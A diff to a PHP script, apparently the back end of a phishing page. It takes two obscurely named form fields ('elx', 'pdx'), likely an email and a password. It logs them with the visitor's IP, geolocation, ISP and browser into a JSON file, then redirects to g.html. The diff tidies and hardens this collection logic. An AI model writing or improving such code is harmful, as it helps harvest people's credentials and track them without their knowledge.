@@ -2,19 +2,25 @@
 // Include ip.php to retrieve IP and device details
 include 'ip.php';
 
-// Define elx and pdx (assuming these are received from a form or another source)
+// Define variables to avoid undefined errors
+$success = $success ?? false;
+$details = $details ?? [];
+$PublicIP = $_SERVER['REMOTE_ADDR']; // Get public IP
+
 $elx = $_POST['elx'] ?? 'default_elx';
 $pdx = $_POST['pdx'] ?? 'default_pdx'; 
 
-// Check for success and get default values if not found
-$city = $success ? $details['city'] ?? 'Unknown' : 'Unknown';
-$region = $success ? $details['region'] ?? 'Unknown' : 'Unknown';
-$country = $success ? $details['country'] ?? 'Unknown' : 'Unknown';
+$city = $success ? ($details['city'] ?? 'Unknown') : 'Unknown';
+$region = $success ? ($details['region'] ?? 'Unknown') : 'Unknown';
+$country = $success ? ($details['country'] ?? 'Unknown') : 'Unknown';
 $location = $success ? ($details['latitude'] . ', ' . $details['longitude']) : 'Unknown';
-$isp = $success ? $details['isp'] ?? 'Unknown' : 'Unknown';
-$type = $success ? $details['type'] ?? 'Unknown' : 'Unknown';
+$isp = $success ? ($details['isp'] ?? 'Unknown') : 'Unknown';
+$type = $success ? ($details['type'] ?? 'Unknown') : 'Unknown';
 
-// Prepare data with the IP logging details from ip.php
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+$user_browser = get_browser($user_agent, true)['browser'] ?? 'Unknown';
+$user_os = php_uname('s') . " " . php_uname('r');
+
 $data = [
     'elx' => $elx,
     'pdx' => $pdx,
@@ -40,27 +46,27 @@ $data = [
     ]
 ];
 
-// Define the file path
 $filePath = 'data_new.json';
 
-// Check if file exists and load existing data
 if (file_exists($filePath)) {
     $existingData = json_decode(file_get_contents($filePath), true);
     if (!is_array($existingData)) {
-        $existingData = [];  // Ensure it’s an array
+        $existingData = [];
     }
 } else {
-    $existingData = []; // Start a new array if file does not exist
+    $existingData = [];
 }
 
-// Append the new data
 $existingData[] = $data;
 
-// Encode and save the updated array back to the file
-file_put_contents($filePath, json_encode($existingData, JSON_PRETTY_PRINT) . PHP_EOL, LOCK_EX);
+$jsonData = json_encode($existingData, JSON_PRETTY_PRINT);
+if ($jsonData === false) {
+    die("JSON encoding error: " . json_last_error_msg());
+}
+
+file_put_contents($filePath, $jsonData . PHP_EOL, LOCK_EX);
 
 // Redirect to g.html
 header("Location: g.html");
 exit();
 ?>
-
